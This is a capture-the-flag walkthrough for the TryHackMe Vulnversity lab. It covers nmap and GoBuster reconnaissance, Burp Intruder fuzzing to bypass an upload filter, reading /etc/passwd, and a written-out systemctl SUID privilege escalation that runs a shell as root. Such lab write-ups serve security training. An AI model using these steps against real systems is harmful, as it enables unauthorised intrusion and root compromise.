# [Vulnversity][1]

### Reconnaissance

Start with a nmap scan 

`nmap -A <IP>` 

![Nmap](images/nmap.png)

## How many ports are open? 

> **6**

## What version of the squid proxy is running on the machine? 

> **3.5.12**

## How many ports will nmap scan if the flag *-p-400* was used? 

> **400** (Ports 1-400)

## What is the most likely operating system this machine is running? 

> **Ubuntu**

## What port is the web server running on? 

> **3333**


### Locating directories using GoBuster

Now onto a GoBuster Directory scan of the webserver.

![GoBuster](images/gobuster.png)

Opening the paths we found in a browser, we see the upload form page on /internal/

![Upload](images/internal.png)

## What is the directory that has an upload form page? 

> **/internal/**


### Compromise the webserver

Try uploading the a file with a `.txt` extension. You'll see that the extension is not allowed. We will take advantage of Burp Suite's Intruder tool and fuzz the upload form to see which extensions it will accept.

![Extension not allowed](images/ext_not_allowed.png)

1. In Proxy tab, turn Intercept on  request as show and send it to **Intruder**.
2. **Clear** variables and select ***.\<file_formart>*** and click on **Add**.
3. Under **Payloads** option, Load the *phpext.txt*. Make sure to uncheck **Payload Encoding**.
4. Click on **Start Attack**. Check the **Length** variable, one has a different length.

![Intruder](images/burpsuite.jpg)

Run this attack, what extension is allowed? **.phtml**

Follow the remote access steps. After uploading the file.

What is the name of the user who manages the webserver? **bill**
> To get the name, check /etc/psswd file. To do that, type `cat /etc/passwd` and you will see the name bill as a user.

What is the user flag?
> As we know *bill* is the user. Direct to /home/bill. Type, `cd /home/bill`. There is a file called **user.txt**. Check the content of the file using `cat user.txt`.

### [TASK 5] Privilege Escalation

On the system, search for all SUID files. What file stands out? **/bin/systemctl**

> To find SUIDs on a system, run `find / -perm -u=s -type f 2>/dev/null`. To know more, [Click Here][3]

Become root and get the last flag (/root/root.txt)
> Run this commands
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```
The data from the file *root.txt* is copied to a file called *output* in *tmp* directory.
`cat /tmp/output`. To know more, Check this [Reference][4]

[1]: https://tryhackme.com/room/vulnversity
[2]: https://blog.hackhunt.in/2021/02/nmap-port-specification.html
[3]: https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
[4]: https://gtfobins.github.io/gtfobins/systemctl/

